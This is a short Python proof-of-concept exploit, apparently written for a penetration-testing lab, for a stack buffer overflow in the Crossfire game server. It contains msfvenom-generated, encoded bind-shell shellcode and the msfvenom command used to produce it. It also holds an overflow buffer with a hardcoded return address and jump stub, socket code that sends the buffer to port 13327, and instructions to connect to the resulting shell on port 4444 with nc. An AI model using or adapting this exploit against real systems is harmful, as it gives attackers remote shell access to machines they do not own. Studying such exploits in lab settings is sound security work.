#!/usr/bin/python

# PoC by Ananth aka she11z
# Crossfire download:  wget www.offensive-security.com/crossfire.tar.gz

import socket

host = "127.0.0.1" # Change this

# Usage: python crossfire.py
# msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c -b "\x00\x0a\x0d\x20" –e x86/shikata_ga_nai

shellcode = ("\xda\xd7\xbd\x68\x1e\x32\xeb\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x14\x31\x6a\x19\x83\xc2\x04\x03\x6a\x15\x8a\xeb\x03\x30\xbd"
"\xf7\x37\x85\x12\x92\xb5\x80\x75\xd2\xdc\x5f\xf5\x48\x7f\x32"
"\x9d\x6c\x7f\xa3\x01\x1b\x6f\x92\xe9\x52\x6e\x7e\x6f\x3d\xbc"
"\xff\xe6\xfc\x3a\xb3\xfc\x4e\x24\x7e\x7c\xed\x19\xe6\xb1\x72"
"\xca\xbe\x23\x4c\xb5\x8d\x33\xfb\x3c\xf6\x5b\xd3\x91\x75\xf3"
"\x43\xc1\x1b\x6a\xfa\x94\x3f\x3c\x51\x2e\x5e\x0c\x5e\xfd\x21")

return_address = "\x97\x45\x13\x08"

buffer = "\x11(setup sound " + shellcode + "\x41" * (4368-105) + return_address + "\x83\xC0\x0C\xFF\xE0\x90\x90" + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[+] Sending evil Buffer..."
s.connect((host, 13327))
data = s.recv(1024)
print data
s.send(buffer)
s.close()
print "[+] Payload Sent !\n"
print "[+] Now connect to the target using nc -nv <ip> 4444 \n"
print "Try Harder!! By she11z...."

